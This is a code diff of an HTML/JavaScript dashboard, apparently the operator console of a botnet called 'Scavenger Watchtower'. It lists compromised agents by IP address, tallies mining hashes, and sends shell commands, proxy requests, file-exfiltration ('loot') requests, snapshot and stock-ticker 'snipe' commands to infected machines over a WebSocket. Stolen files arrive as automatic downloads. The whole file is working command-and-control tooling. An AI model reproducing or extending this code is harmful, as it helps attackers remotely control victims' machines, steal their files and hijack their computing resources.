@@ -1,270 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SCAVENGER // WATCHTOWER</title>
+    <title>SCAVENGER WATCHTOWER</title>
     <style>
-        :root {
-            --bg-color: #004e5a;
-            --window-bg: #2d2d2d;
-            --text-color: #dcdcdc;
-            --bevel-light: #505050;
-            --bevel-dark: #1a1a1a;
-            --header-blue: #000080;
-            --accent-green: #00ff41;
-        }
-
-        body { 
-            background-color: var(--bg-color); 
-            font-family: 'Tahoma', 'MS Sans Serif', sans-serif; 
-            margin: 0; padding: 10px; 
-            color: var(--text-color);
-            height: 100vh;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .win-border {
-            border-top: 2px solid var(--bevel-light);
-            border-left: 2px solid var(--bevel-light);
-            border-right: 2px solid var(--bevel-dark);
-            border-bottom: 2px solid var(--bevel-dark);
-            background: var(--window-bg);
-            padding: 2px;
-        }
-
-        .win-inset {
-            border-top: 2px solid var(--bevel-dark);
-            border-left: 2px solid var(--bevel-dark);
-            border-right: 2px solid var(--bevel-light);
-            border-bottom: 2px solid var(--bevel-light);
-            background: #000;
-        }
-
-        .title-bar {
-            background: linear-gradient(90deg, #000080, #1084d0);
-            color: white;
-            padding: 4px 8px;
-            font-weight: bold;
-            font-size: 14px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .window-content { padding: 10px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .stat-box { display: flex; flex-direction: column; gap: 5px; }
-        .stat-label { font-size: 12px; color: #aaa; }
-        .stat-value { font-size: 24px; font-weight: bold; font-family: 'Courier New', monospace; }
-
-        /* TABLE STYLES */
+        :root { --bg: #004e5a; --win-bg: #2d2d2d; --text: #dcdcdc; --accent: #00ff41; }
+        body { background: var(--bg); font-family: 'Tahoma', sans-serif; margin: 0; padding: 10px; color: var(--text); height: 100vh; display: flex; flex-direction: column; gap: 10px; box-sizing: border-box; }
+        .win-border { border: 2px solid #505050; border-right-color: #1a1a1a; border-bottom-color: #1a1a1a; background: var(--win-bg); padding: 2px; }
+        .win-inset { border: 2px solid #1a1a1a; border-right-color: #505050; border-bottom-color: #505050; background: #000; }
+        .title-bar { background: linear-gradient(90deg, #000080, #1084d0); color: white; padding: 4px; font-weight: bold; font-size: 14px; display: flex; justify-content: space-between; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
         table { width: 100%; border-collapse: collapse; font-family: 'Courier New', monospace; font-size: 12px; }
-        th { text-align: left; color: #888; border-bottom: 1px solid #333; padding: 2px; }
-        td { padding: 2px; color: var(--accent-green); }
-        .role-mining { color: #fff; }
-        .role-proxy { color: #ff00ff; }
-        .role-idle { color: #555; }
-
-        #log-window {
-            flex-grow: 1;
-            overflow-y: scroll;
-            padding: 5px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: #ccc;
-        }
-
+        th { text-align: left; color: #888; border-bottom: 1px solid #333; }
+        td { padding: 2px; color: var(--accent); }
+        .role-proxy { color: #ff00ff; } .role-idle { color: #555; }
+        #log-window { flex-grow: 1; overflow-y: scroll; padding: 5px; font-family: 'Courier New'; font-size: 13px; color: #ccc; }
         .log-entry { margin-bottom: 2px; }
-        .timestamp { color: #888; margin-right: 8px; }
     </style>
 </head>
 <body>
-
     <div class="win-border">
-        <div class="title-bar">
-            <span>System Monitor - PID: 4092</span>
-            <span>X</span>
-        </div>
-        <div class="window-content grid">
-
-            <div class="stat-box" style="grid-column: span 1;">
-                <span class="stat-label">Active Agents Grid</span>
+        <div class="title-bar"><span>System Monitor - PID: 4092</span><span>X</span></div>
+        <div class="grid">
+            <div style="grid-column: span 1;">
+                <span style="font-size:12px; color:#aaa;">Active Agents Grid</span>
                 <div class="win-inset" style="height: 100px; overflow-y: scroll; padding: 5px;">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>UNIT ID</th>
-                                <th>IP ADDRESS</th>
-                                <th>TASK</th>
-                            </tr>
-                        </thead>
-                        <tbody id="workerTable">
-                            </tbody>
-                    </table>
+                    <table><thead><tr><th>UNIT ID</th><th>IP ADDRESS</th><th>TASK</th></tr></thead><tbody id="workerTable"></tbody></table>
                 </div>
             </div>
-
-            <div class="stat-box">
-                <span class="stat-label">Hashes Computed (M)</span>
-                <span id="hashCount" class="stat-value">0.00M</span>
-                <div style="background: #ccc; height: 18px; border: 1px solid #000; position: relative; margin-top:5px;">
+            <div>
+                <span style="font-size:12px; color:#aaa;">Hashes Computed (M)</span>
+                <div style="font-size: 24px; font-weight: bold; font-family: 'Courier New'; margin-bottom: 5px;" id="hashCount">0.00M</div>
+                <div style="background: #ccc; height: 18px; border: 1px solid #000; position: relative;">
                     <div id="taskBar" style="background: #000080; width: 0%; height: 100%; transition: width 0.3s;"></div>
-                    <div id="percText" style="position: absolute; top:0; width: 100%; text-align: center; color: white; font-size: 11px; mix-blend-mode: difference; line-height: 18px;">Scanning...</div>
+                    <div id="percText" style="position: absolute; top:0; width: 100%; text-align: center; color: white; font-size: 11px; mix-blend-mode: difference;">Scanning...</div>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="win-border" style="margin-top: 5px; padding: 5px; background: #000;">
-        <div style="display: flex; align-items: center; color: var(--accent-green);">
+    <div class="win-border" style="padding: 5px; background: #000;">
+        <div style="display: flex; align-items: center; color: var(--accent);">
             <span style="margin-right: 10px; font-family: 'Courier New'; font-weight: bold;">ADMIN@HYDRA:~$</span>
-            <input type="text" id="cmdInput" placeholder="curl... | download... | snap... | $ whoami" 
-                   style="background: transparent; border: none; color: white; font-family: 'Courier New'; width: 100%; outline: none;">
+            <input type="text" id="cmdInput" placeholder="Command..." style="background: transparent; border: none; color: white; font-family: 'Courier New'; width: 100%; outline: none;">
         </div>
     </div>
 
-    <div class="win-border" style="flex-grow: 1; display: flex; flex-direction: column; margin-top: 10px;">
-        <div class="title-bar">
-            <span>Event Log (C:\SYSTEM\LOGS)</span>
-            <div style="font-size: 10px;">v3.0 (Watchtower)</div>
-        </div>
-        <div class="window-content" style="flex-grow: 1; display: flex; flex-direction: column;">
-            <div id="log-window" class="win-inset"></div>
-        </div>
+    <div class="win-border" style="flex-grow: 1; display: flex; flex-direction: column;">
+        <div class="title-bar"><span>Event Log</span><div style="font-size: 10px;">v3.1 (Warlord)</div></div>
+        <div class="win-inset" id="log-window"></div>
     </div>
 
     <script>
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const wsUrl = protocol + '//' + window.location.host;
-        let ws;
-        const logDiv = document.getElementById('log-window');
+        let ws; const logDiv = document.getElementById('log-window');
 
         function connect() {
+            let key = localStorage.getItem('access_key');
+            if (!key) {
+                key = prompt("ENTER SYSTEM ACCESS KEY:");
+                if (key) localStorage.setItem('access_key', key);
+            }
             log("Initializing winsock...");
-            ws = new WebSocket(wsUrl);
+            ws = new WebSocket(wsUrl + '?key=' + key);
 
-            ws.onopen = () => {
-                log("Connected to Mainframe.");
-                ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' }));
-            };
-
+            ws.onopen = () => { log("Connected to Mainframe."); ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); };
+            ws.onclose = () => { log("Connection lost. Retrying..."); setTimeout(connect, 3000); };
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
-
                 if(data.type === 'STATS') updateDashboard(data);
-                if(data.type === 'PROXY_LOG') handleProxyLog(data.data);
-                if(data.type === 'SHELL_LOG') handleShellLog(data.output);
-                
-                // EXFILTRATION HANDLER
-                if(data.type === 'EXFIL_RECEIVE') {
-                    log(`[SUCCESS] Incoming Loot: ${data.filename}`);
-                    downloadFile(data.filename, data.data);
-                }
-            };
-
-            ws.onclose = () => {
-                log("Connection lost. Retrying...");
-                setTimeout(connect, 3000);
+                if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status || 'Error'}`);
+                if(data.type === 'SHELL_LOG') log(`<div style="color:#ff00ff">${data.output.replace(/\n/g, "<br>")}</div>`);
+                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] ${data.filename}`); downloadFile(data.filename, data.data); }
+                if(data.type === 'SNIPE_LOG') { if(data.data.mentions > 0) log(`[ALPHA] ${data.data.ticker} detected: ${data.data.mentions} mentions.`); }
             };
         }
 
         function updateDashboard(data) {
-            // Update Hashes
-            const millions = (data.totalHashes / 1000000).toFixed(2);
-            document.getElementById('hashCount').innerText = millions + "M";
-
-            // Update Table
-            const tbody = document.getElementById('workerTable');
-            tbody.innerHTML = ''; 
-
+            document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2) + "M";
+            const tbody = document.getElementById('workerTable'); tbody.innerHTML = '';
             data.workers.forEach(w => {
                 const row = document.createElement('tr');
-                let roleClass = 'role-mining';
-                if(w.role === 'PROXYING') roleClass = 'role-proxy';
-                if(w.role === 'CONNECTING') roleClass = 'role-idle';
-
-                row.innerHTML = `
-                    <td>${w.id}</td>
-                    <td>${w.ip}</td>
-                    <td class="${roleClass}">${w.role}</td>
-                `;
+                let color = w.role === 'PROXYING' ? '#ff00ff' : (w.role === 'IDLE' ? '#555' : '#fff');
+                row.innerHTML = `<td>${w.id}</td><td>${w.ip}</td><td style="color:${color}">${w.role}</td>`;
                 tbody.appendChild(row);
             });
-
             if (data.goldenTicket) {
-                document.getElementById('taskBar').style.width = "100%";
-                document.getElementById('taskBar').style.backgroundColor = "gold";
+                document.getElementById('taskBar').style.width = "100%"; document.getElementById('taskBar').style.backgroundColor = "gold";
                 document.getElementById('percText').innerText = "SUCCESS: " + data.goldenTicket;
             }
         }
 
-        // --- COMMAND HANDLER ---
         document.getElementById('cmdInput').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') {
-                const cmd = this.value;
-                this.value = '';
-
-                // 1. Ghost Shell
-                if (cmd.startsWith('$ ')) {
-                    const realCmd = cmd.substring(2);
-                    log(`> [SHELL] ${realCmd}`);
-                    ws.send(JSON.stringify({ type: 'SEND_SHELL_CMD', command: realCmd }));
-                }
-                // 2. Proxy (Hydra)
-                else if (cmd.startsWith('curl ')) {
-                    const url = cmd.split(' ')[1];
-                    log(`> [PROXY] Routing: ${url}`);
-                    ws.send(JSON.stringify({ type: 'SEND_PROXY_CMD', url: url }));
-                }
-                // 3. Exfiltration (Loot Chute)
-                else if (cmd.startsWith('download ')) {
-                    const path = cmd.split(' ')[1];
-                    log(`> [EXFIL] Requesting file: ${path}`);
-                    ws.send(JSON.stringify({ type: 'SEND_EXFIL_CMD', path: path }));
-                }
-                // 4. Ghost Eye (Snapshot)
-                else if (cmd.startsWith('snap ')) {
-                    const url = cmd.split(' ')[1];
-                    log(`> [EYE] Deploying camera drone to: ${url}`);
-                    ws.send(JSON.stringify({ type: 'SEND_SNAPSHOT_CMD', url: url }));
-                }
-                else {
-                    log(`> Unknown command. Try: $ ls, curl, download, snap`);
-                }
+                const cmd = this.value; this.value = '';
+                if (cmd.startsWith('$ ')) ws.send(JSON.stringify({ type: 'SEND_SHELL_CMD', command: cmd.substring(2) }));
+                else if (cmd.startsWith('curl ')) ws.send(JSON.stringify({ type: 'SEND_PROXY_CMD', url: cmd.split(' ')[1] }));
+                else if (cmd.startsWith('download ')) ws.send(JSON.stringify({ type: 'SEND_EXFIL_CMD', path: cmd.split(' ')[1] }));
+                else if (cmd.startsWith('snap ')) ws.send(JSON.stringify({ type: 'SEND_SNAPSHOT_CMD', url: cmd.split(' ')[1] }));
+                else if (cmd.startsWith('snipe ')) ws.send(JSON.stringify({ type: 'SEND_SNIPE_CMD', ticker: cmd.split(' ')[1] }));
+                else log("Unknown command.");
             }
         });
 
-        // --- HELPER FUNCTIONS ---
-        function downloadFile(filename, base64Content) {
-            const link = document.createElement('a');
-            link.href = `data:application/octet-stream;base64,${base64Content}`;
-            link.download = filename;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            log(`[DISK] Saved ${filename} to Downloads folder.`);
+        function downloadFile(filename, base64) {
+            const link = document.createElement('a'); link.href = `data:application/octet-stream;base64,${base64}`;
+            link.download = filename; document.body.appendChild(link); link.click(); document.body.removeChild(link);
         }
-
-        function handleProxyLog(res) {
-            if (res.error) log(`[ERROR] ${res.error}`);
-            else log(`[${res.status}] Response size: ${res.body.length} bytes`);
-        }
-
-        function handleShellLog(output) {
-            const formatted = output.replace(/\n/g, "<br>");
-            log(`<div style="color: #ff00ff;">${formatted}</div>`);
-        }
-
         function log(msg) {
-            const line = document.createElement('div');
-            line.className = 'log-entry';
-            line.innerHTML = `<span class="timestamp">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
-            logDiv.appendChild(line);
-            logDiv.scrollTop = logDiv.scrollHeight;
+            const line = document.createElement('div'); line.className = 'log-entry';
+            line.innerHTML = `<span style="color:#888">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
         }
-
         connect();
     </script>
 </body>
